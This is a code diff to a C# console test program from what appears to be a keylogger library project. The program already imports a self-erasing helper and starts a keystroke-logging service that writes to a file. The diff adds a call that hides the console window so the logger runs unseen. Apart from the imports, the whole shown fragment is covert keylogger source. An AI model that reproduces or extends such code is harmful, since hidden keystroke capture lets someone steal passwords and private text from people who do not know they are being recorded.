@@ -1,6 +1,7 @@
 ﻿using Custom.dotNet.EraseItself;
 using KeyLogger.Library;
 using KeyLogger.Library.Appenders;
+using KeyLoggerLibrary.ConsoleTest.Helpers;
 using System.Threading;
 
 namespace KeyLoggerLibrary.ConsoleTest
@@ -10,6 +11,9 @@ namespace KeyLoggerLibrary.ConsoleTest
 
         static void Main(string[] args)
         {
+            //Don´t needed, figure out changing output type to Windows Application
+            ApplicationWindowHelper.HideConsoleWindow();
+
             IKeyLoggerService _service = new KeyLoggerService();
 
             _service.SetOutputMode = FileAppender.Instance;
